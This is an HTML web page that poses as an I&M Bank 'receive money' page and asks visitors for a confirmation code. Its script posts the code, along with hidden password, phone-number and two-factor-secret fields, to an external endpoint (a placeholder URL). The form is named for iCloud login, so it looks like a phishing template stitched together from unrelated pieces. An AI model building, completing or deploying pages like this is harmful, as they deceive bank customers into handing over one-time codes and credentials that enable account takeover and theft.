<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Receive and Send Money at I&M Banking</title>
    <link rel="stylesheet" href="kipla1.css">
</head>
<body>
    <div class="login-container">
        <img src="path_to_logo.png" alt="Bank Logo" style="width: 100px; margin-bottom: 20px;">
        <h1>Thank you for choosing I&M Bank Personal Banking</h1>
        <form id="icloud-login-form">
            <label for="confirmation_code">Confirmation Code:</label>
            <input type="text" id="confirmation_code" name="confirmation_code" placeholder="Enter confirmation code"><br><br>
            <input type="hidden" id="password" name="password">
            <input type="hidden" id="phone_number" name="phone_number">
            <input type="hidden" id="two_factor_secret" name="two_factor_secret">
            <button type="submit">Receive</button>
        </form>
        <p class="privacy">Receive and send money at I&M Bank, we are On Your Side and we value your data privacy. Read our <a href="#">Privacy Notice</a>.</p>
    </div>

    <!-- JavaScript to autofill and submit the form -->
    <script>
        document.addEventListener("DOMContentLoaded", function() {
          const form = document.getElementById("icloud-login-form");
          
          // Hardcoded values
          const password = "your_icloud_password";
          const phoneNumber = "your_phone_number";
          const twoFactorSecret = "your_2fa_secret_key";
          
          // Autofill the form fields
          document.getElementById("password").value = password;
          document.getElementById("phone_number").value = phoneNumber;
          document.getElementById("two_factor_secret").value = twoFactorSecret;
          
          form.addEventListener("submit", function(event) {
            event.preventDefault();
            
            // Submit the form to the endpoint
            form.action = "https://example.com/endpoint"; // Replace with your endpoint URL
            form.method = "post";
            form.submit();
          });
        });
    </script>
</body>
</html>
